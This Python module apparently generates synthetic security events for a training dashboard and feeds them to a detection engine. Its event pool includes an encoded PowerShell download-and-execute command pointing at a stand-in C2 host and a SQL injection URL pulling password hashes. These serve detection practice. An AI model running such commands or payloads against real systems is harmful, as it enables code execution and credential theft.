import asyncio
import random
import logging
from datetime import datetime
from typing import Optional, List, Dict, Any
from app.database.connection import SessionLocal
from app.models.event import Event
from app.models.alert import Alert
from app.services.detection_engine import detection_engine
from app.websocket.manager import ws_manager

logger = logging.getLogger("threatwatch.simulation")

SYNTHETIC_EVENT_POOL = [
    # Benign events
    {
        "source": "Windows",
        "event_type": "SUCCESSFUL_LOGIN",
        "severity": "INFORMATIONAL",
        "source_ip": "192.168.1.105",
        "destination_ip": "192.168.1.20",
        "source_host": "DESKTOP-FIN02",
        "destination_host": "DC-PRIMARY",
        "username": "sarah.finance",
        "process": "C:\\Windows\\System32\\lsass.exe",
        "message": "An account was successfully logged on. Logon Type: 3 (Network).",
        "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>4624</EventID></System><EventData><Data Name='TargetUserName'>sarah.finance</Data><Data Name='IpAddress'>192.168.1.105</Data></EventData></Event>",
        "mitre_technique": None
    },
    {
        "source": "Firewall",
        "event_type": "ALLOW_TRAFFIC",
        "severity": "LOW",
        "source_ip": "192.168.1.45",
        "destination_ip": "142.250.190.46",
        "source_host": "WORKSTATION-ENG",
        "destination_host": "google-dns",
        "username": None,
        "process": None,
        "message": "OUTBOUND ALLOW: PROTO=TCP SPT=54120 DPT=443 SYN_SENT",
        "raw_log": "Sep 12 09:12:01 ufw-firewall kernel: [UFW ALLOW] IN=eth0 OUT=eth1 SRC=192.168.1.45 DST=142.250.190.46 PROTO=TCP SPT=54120 DPT=443",
        "mitre_technique": None
    },
    {
        "source": "DNS",
        "event_type": "DNS_QUERY",
        "severity": "INFORMATIONAL",
        "source_ip": "192.168.1.88",
        "destination_ip": "192.168.1.2",
        "source_host": "DESKTOP-HR01",
        "destination_host": "DNS-CORP",
        "username": "john.hr",
        "process": "svchost.exe",
        "message": "DNS Standard Query for mail.internal.corp A record.",
        "raw_log": "client 192.168.1.88#53812 (mail.internal.corp): query: mail.internal.corp IN A + (192.168.1.2)",
        "mitre_technique": None
    },

    # Brute Force sequences
    {
        "source": "Windows",
        "event_type": "FAILED_LOGIN",
        "severity": "HIGH",
        "source_ip": "198.51.100.23",
        "destination_ip": "192.168.1.50",
        "source_host": "EXTERNAL-HOST",
        "destination_host": "SRV-RDP-GATEWAY",
        "username": "administrator",
        "process": "C:\\Windows\\System32\\svchost.exe",
        "message": "An account failed to log on. Event ID: 4625. Status: 0xC000006D. Substatus: 0xC000006A (Bad password).",
        "raw_log": "<Event><System><EventID>4625</EventID></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>198.51.100.23</Data></EventData></Event>",
        "mitre_technique": "T1110.001"
    },

    # Port Scan
    {
        "source": "Firewall",
        "event_type": "PORT_SCAN",
        "severity": "MEDIUM",
        "source_ip": "203.0.113.88",
        "destination_ip": "192.168.1.10",
        "source_host": "ATTACKER-SCANNER",
        "destination_host": "DMZ-WEB01",
        "username": None,
        "process": None,
        "message": "PORT_SCAN detected: Multiple connection attempts to DPT=21, DPT=22, DPT=80, DPT=443, DPT=3389 within 2 seconds.",
        "raw_log": "Sep 12 09:12:15 firewall-01 kernel: [PORT_SCAN_REJECT] SRC=203.0.113.88 DST=192.168.1.10 PROTO=TCP DPT=3389 FLAGS=SYN",
        "mitre_technique": "T1046"
    },

    # Suspicious PowerShell
    {
        "source": "Windows",
        "event_type": "SUSPICIOUS_PROCESS",
        "severity": "HIGH",
        "source_ip": "192.168.1.140",
        "destination_ip": "192.168.1.140",
        "source_host": "WORKSTATION-CEO",
        "destination_host": "WORKSTATION-CEO",
        "username": "alex.executive",
        "process": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBuAGUAdAAvAGkAbgB2AG8AawBlAC4AcABzADEAJwApAA==",
        "message": "Process Creation Event ID 4688: PowerShell launched with Base64 encoded payload and execution policy bypass flags.",
        "raw_log": "<Event><System><EventID>4688</EventID></System><EventData><Data Name='NewProcessName'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='CommandLine'>powershell.exe -Enc SQBFAFgA...</Data></EventData></Event>",
        "mitre_technique": "T1059.001"
    },

    # Phishing Lure
    {
        "source": "Authentication",
        "event_type": "PHISHING_DETECTED",
        "severity": "MEDIUM",
        "source_ip": "185.220.101.5",
        "destination_ip": "192.168.1.25",
        "source_host": "MAIL-GATEWAY",
        "destination_host": "MAIL-CORP",
        "username": "finance-team@threatwatch.local",
        "process": "postfix/cleanup",
        "message": "Inbound email rejected: SPF=fail, From: billing@bankofamer1ca-notice.com, Attachment: urgent_invoice_2026.pdf.exe",
        "raw_log": "Sep 12 09:12:30 mail-gw postfix[4490]: SPF check failed for 185.220.101.5; domain=bankofamer1ca-notice.com; attachment=urgent_invoice_2026.pdf.exe",
        "mitre_technique": "T1566.001"
    },

    # Malware IOC C2
    {
        "source": "Endpoint",
        "event_type": "MALWARE_DETECTED",
        "severity": "CRITICAL",
        "source_ip": "192.168.1.140",
        "destination_ip": "45.33.32.156",
        "source_host": "WORKSTATION-CEO",
        "destination_host": "C2-SERVER",
        "username": "alex.executive",
        "process": "svchost_updater.exe",
        "message": "Malware Beaconing Detected: Outbound HTTP POST to known C2 IP 45.33.32.156 / malicious-c2.net. Hash: e3b0c44298fc1c149afbf4c8996fb924",
        "raw_log": "EndpointAgent: Malicious communication flagged. Hash=e3b0c44298fc1c149afbf4c8996fb924 RemoteIP=45.33.32.156 Hostname=malicious-c2.net",
        "mitre_technique": "T1071.001"
    },

    # SQL Injection
    {
        "source": "Web Server",
        "event_type": "SQL_INJECTION",
        "severity": "HIGH",
        "source_ip": "198.51.100.99",
        "destination_ip": "192.168.1.10",
        "source_host": "ATTACKER-IP",
        "destination_host": "DMZ-WEB01",
        "username": None,
        "process": "nginx/1.24.0",
        "message": "HTTP 500 GET /products.php?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users-- User-Agent: sqlmap/1.7#dev",
        "raw_log": "198.51.100.99 - - [12/Sep/2026:09:12:45 +0000] \"GET /products.php?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1\" 500 1289 \"-\" \"sqlmap/1.7\"",
        "mitre_technique": "T1190"
    },

    # DDoS Volumetric
    {
        "source": "Firewall",
        "event_type": "DDOS_ANOMALY",
        "severity": "CRITICAL",
        "source_ip": "203.0.113.0/24",
        "destination_ip": "192.168.1.1",
        "source_host": "DISTRIBUTED-BOTNET",
        "destination_host": "EDGE-ROUTER",
        "username": None,
        "process": None,
        "message": "SYN Flood Traffic Spike: 85,000 packets/sec received targeting port 80. CPU threshold exceeded on Edge Router.",
        "raw_log": "Sep 12 09:13:00 edge-gw ddos-detector[110]: Volumetric flood detected. Ingress rate: 450 Mbps, 85k pps. Target: 192.168.1.1:80",
        "mitre_technique": "T1498.001"
    }
]

class SimulationService:
    def __init__(self):
        self.is_running: bool = False
        self.is_paused: bool = False
        self.difficulty: str = "BEGINNER"  # BEGINNER, INTERMEDIATE, ADVANCED
        self.events_generated: int = 0
        self.alerts_triggered: int = 0
        self.last_event_time: Optional[datetime] = None
        self._task: Optional[asyncio.Task] = None

    def get_status(self) -> Dict[str, Any]:
        return {
            "is_running": self.is_running,
            "is_paused": self.is_paused,
            "difficulty": self.difficulty,
            "events_generated": self.events_generated,
            "alerts_triggered": self.alerts_triggered,
            "last_event_time": self.last_event_time
        }

    async def start(self, difficulty: str = "BEGINNER") -> Dict[str, Any]:
        self.difficulty = difficulty
        if not self.is_running:
            self.is_running = True
            self.is_paused = False
            self._task = asyncio.create_task(self._simulation_loop())
            logger.info(f"Simulation started with difficulty {difficulty}")
        elif self.is_paused:
            self.is_paused = False
            logger.info("Simulation unpaused")
        return self.get_status()

    def pause(self) -> Dict[str, Any]:
        if self.is_running:
            self.is_paused = True
            logger.info("Simulation paused")
        return self.get_status()

    def stop(self) -> Dict[str, Any]:
        self.is_running = False
        self.is_paused = False
        if self._task and not self._task.done():
            self._task.cancel()
        logger.info("Simulation stopped")
        return self.get_status()

    def reset_stats(self):
        self.events_generated = 0
        self.alerts_triggered = 0
        self.last_event_time = None

    async def generate_single_event(self) -> Dict[str, Any]:
        template = random.choice(SYNTHETIC_EVENT_POOL)
        now = datetime.utcnow()
        event_dict = {
            "timestamp": now,
            "source": template["source"],
            "event_type": template["event_type"],
            "severity": template["severity"],
            "source_ip": template.get("source_ip"),
            "destination_ip": template.get("destination_ip"),
            "source_host": template.get("source_host"),
            "destination_host": template.get("destination_host"),
            "username": template.get("username"),
            "process": template.get("process"),
            "message": template["message"],
            "raw_log": template["raw_log"],
            "mitre_technique": template.get("mitre_technique"),
            "metadata_json": "{}"
        }

        db = SessionLocal()
        try:
            # Save Event to database
            new_event = Event(**event_dict)
            db.add(new_event)
            db.commit()
            db.refresh(new_event)

            self.events_generated += 1
            self.last_event_time = now

            # Fetch recent events for correlation
            recent_events = db.query(Event).order_by(Event.id.desc()).limit(20).all()
            history = [
                {
                    "source_ip": e.source_ip,
                    "event_type": e.event_type,
                    "timestamp": e.timestamp,
                    "message": e.message,
                    "destination_ip": e.destination_ip
                }
                for e in recent_events
            ]

            # Evaluate with Detection Engine
            alerts = detection_engine.analyze_event(event_dict, history)
            created_alerts = []
            for a in alerts:
                # Avoid duplicate identical alerts within 1 minute
                existing = db.query(Alert).filter(
                    Alert.detection_rule == a["detection_rule"],
                    Alert.source_ip == a.get("source_ip"),
                    Alert.status != "Resolved"
                ).first()

                if not existing:
                    new_alert = Alert(
                        title=a["title"],
                        timestamp=now,
                        severity=a["severity"],
                        source_ip=a.get("source_ip"),
                        destination_ip=a.get("destination_ip"),
                        source_host=a.get("source_host"),
                        destination_host=a.get("destination_host"),
                        username=a.get("username"),
                        event_type=a["event_type"],
                        description=a["description"],
                        detection_rule=a["detection_rule"],
                        mitre_technique=a["mitre_technique"],
                        status="New",
                        assigned_analyst="Unassigned",
                        notes=f"Auto-generated by {a['detection_rule']}"
                    )
                    db.add(new_alert)
                    db.commit()
                    db.refresh(new_alert)
                    self.alerts_triggered += 1
                    created_alerts.append({
                        "id": new_alert.id,
                        "title": new_alert.title,
                        "severity": new_alert.severity,
                        "detection_rule": new_alert.detection_rule,
                        "timestamp": new_alert.timestamp.isoformat()
                    })

            # Broadcast via WebSocket
            ws_payload = {
                "type": "security_event",
                "event": {
                    "id": new_event.id,
                    "timestamp": new_event.timestamp.isoformat(),
                    "source": new_event.source,
                    "event_type": new_event.event_type,
                    "severity": new_event.severity,
                    "source_ip": new_event.source_ip,
                    "destination_ip": new_event.destination_ip,
                    "message": new_event.message
                },
                "alerts": created_alerts,
                "simulation_status": self.get_status()
            }
            await ws_manager.broadcast(ws_payload)
            return ws_payload
        finally:
            db.close()

    async def _simulation_loop(self):
        delays = {
            "BEGINNER": 6.0,
            "INTERMEDIATE": 3.5,
            "ADVANCED": 1.8
        }
        while self.is_running:
            if not self.is_paused:
                try:
                    await self.generate_single_event()
                except Exception as e:
                    logger.error(f"Error in simulation loop: {e}")
            delay = delays.get(self.difficulty, 5.0)
            await asyncio.sleep(delay)

simulation_service = SimulationService()
